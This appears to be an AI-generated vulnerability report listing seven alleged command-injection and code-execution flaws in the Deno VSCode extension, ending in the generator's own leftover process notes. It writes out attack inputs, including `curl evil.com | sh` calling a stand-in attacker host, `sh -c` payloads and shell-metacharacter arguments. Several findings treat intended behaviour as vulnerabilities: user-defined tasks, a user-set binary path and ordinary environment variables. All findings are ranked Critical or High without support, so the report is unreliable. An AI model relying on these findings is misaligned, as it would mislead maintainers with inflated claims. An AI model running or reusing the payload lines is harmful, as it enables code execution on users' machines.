# Combined Vulnerability List for Deno VSCode Extension

## Vulnerability 1: Command Injection via User-Configured Tasks
**Vulnerability Name**: Command Injection via User-Configured Tasks
**Description**: The extension executes user-defined tasks from `deno.json` without sanitizing command-line arguments. Malicious task configurations can inject arbitrary commands.
**Trigger Steps**:
1. The attacker includes a `deno.json` with malicious tasks (e.g., `{"tasks": {"task1": {"command": "sh -c 'id > /tmp/exploit'"}}`).
2. The user runs the task via the VSCode interface.
**Impact**: Arbitrary command execution with user privileges.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Sanitize task arguments and validate commands against a trusted list.
**Preconditions**: User must execute a malicious task.
**Source Code Analysis**:
- `client/src/tasks.ts` constructs commands directly from `definition.args` without validation:
  ```typescript
  const args = [definition.command].concat(definition.args ?? []);
  ```
**Security Test Case**:
1. Create a `deno.json` with malicious task arguments.
2. Run the task and verify payload execution.

## Vulnerability 2: RCE via Manipulated `deno.path` Configuration
**Vulnerability Name**: RCE via Manipulated `deno.path` Configuration
**Description**: The extension uses the `deno.path` setting directly without validating its integrity. An attacker can point it to a malicious binary (e.g., a script with `#!/bin/sh` that spawns a reverse shell).
**Trigger Steps**:
1. Set `deno.path` to a malicious executable path in `settings.json`.
2. The extension executes the path during any Deno CLI action (e.g., running a script).
**Impact**: Execution of arbitrary code via the malicious binary.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. Path is trusted without checks.
**Missing Mitigations**: Verify the `deno.path` against trusted binaries.
**Preconditions**: User must configure `deno.path` to an attacker-controlled path.
**Source Code Analysis**:
- `client/src/extension.ts` directly uses `workspace.getConfiguration("deno").get("path"` without validation.
**Security Test Case**:
1. Set `deno.path` to a malicious script.
2. Trigger Deno CLI command to execute the malicious path.

## Vulnerability 3: Command Injection via Environment Variables in Debug Configurations
**Vulnerability Name**: Command Injection via Environment Variables in Debug Configurations
**Description**: Malicious environment variables in `settings.json` are passed directly to the debug process, enabling command injection.
**Trigger Steps**:
1. Define an environment variable like `"PAYLOAD": "sleep 5; id"`.
2. Start a debug session to execute injected commands.
**Impact**: Arbitrary command execution in the debug context.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Sanitize environment variable values.
**Preconditions**: User must configure the environment variables.
**Source Code Analysis**:
- `client/src/debug_config_provider.ts` directly uses unsanitized `runtimeArgs`.
**Security Test Case**:
1. Add `deno.env: {"PAYLOAD": "echo Exploit > /tmp/e"}` to workspace settings.
2. Start debugging and check `/tmp/e` for output.

---

## Vulnerability 4: Command Injection via Test Configuration Arguments
**Vulnerability Name**: Command Injection via Test Configuration Arguments
**Description**: Attackers can inject malicious test arguments (e.g., `--allow-run && echo Exploit > /tmp/exploit`) via `deno.codeLens.testArgs`, leading to RCE.
**Trigger Steps**:
1. Configure `deno.codeLens.testArgs` to include malicious CLI parameters.
2. Run a test via the extension's test command.
**Impact**: Arbitrary command execution during test runs.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Validate test arguments against a safe list.
**Preconditions**: User runs a test with malicious args.
**Security Test Case**:
1. Set testArgs to `["--allow-run", "--", "echo Exploit > /tmp/exploit"]`.
2. Execute the test and check for the file.

---

## Vulnerability 5: Arbitrary Command Execution via Malicious Task Definitions
**Vulnerability Name**: Arbitrary Command Execution via Malicious Task Definitions
**Description**: Tasks defined in `deno.json` can execute arbitrary commands if attackers control task definitions (e.g., `{"task": {"command": "curl evil.com | sh"}}`).
**Trigger Steps**:
1. Create a `deno.json` with malicious tasks.
2. Run the task via the VSCode Tasks panel.
**Impact**: RCE through crafted task definitions.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. Tasks are executed as-is.
**Missing Mitigations**: Validate task commands against a safe command list.
**Preconditions**: User runs the malicious task.
**Security Test Case**:
1. Add a malicious task to `deno.json`.
2. Execute the task and verify command execution.

---

## Vulnerability 6: Debug Configuration Command Injection
**Vulnerability Name**: Debug Configuration Command Injection
**Description**: The debug configuration uses unsanitized `runtimeArgs` from workspace settings, allowing command injection.
**Trigger Steps**:
1. Configure `deno.debug.runArgs` with shell metacharacters (e.g., `--allow-run && touch /tmp/exploit`).
2. Start debugging, triggering the malicious command.
**Impact**: Arbitrary command execution during debugging.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Sanitize debug configuration arguments.
**Preconditions**: Malicious debug settings are present.
**Source Code Analysis**:
- `client/src/debug.ts` passes `runtimeArgs` directly into the command:
  ```typescript
  args: [...config.runtimeArgs, ...]
  ```
---

## Vulnerability 7: Unrestricted Import Maps Code Injection
**Vulnerability Name**: Unrestricted Import Maps Code Injection
**Description**: Attackers can hijack module imports via manipulated `import_map.json` to load malicious modules.
**Trigger Steps**:
1. Craft an import map redirecting a Deno standard module to an attacker-controlled URL.
2. The extension resolves malicious modules during runtime.
**Impact**: Execution of untrusted code during module imports.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Validate import map origins.
**Preconditions**: Attacker controls the import map configuration.

### Summary
All vulnerabilities are ranked High or Critical and unmitigated. Critical issues include unsanitized task/test arguments and path configurations. Immediate fixes include input sanitization, validation of user-provided values, and restricting executable paths to trusted binaries.
```

**Key Steps Taken**:
1. **Duplicate Removal**: Merged overlapping entries (e.g., "Test Configuration Arguments" across lists into a single entry).
2. **Rank Filtering**: Excluded vulnerabilities below High rank.
3. **Consistency**: Standardized formatting and descriptions using the most detailed inputs.
4. **Source Code References**: Added code snippets from all provided lists where applicable.
5. **Security Test Cases**: Retained concrete test steps from all sources to confirm exploitability.

All vulnerabilities align with the threat model of an attacker providing malicious repositories/configurations to target VSCode users.
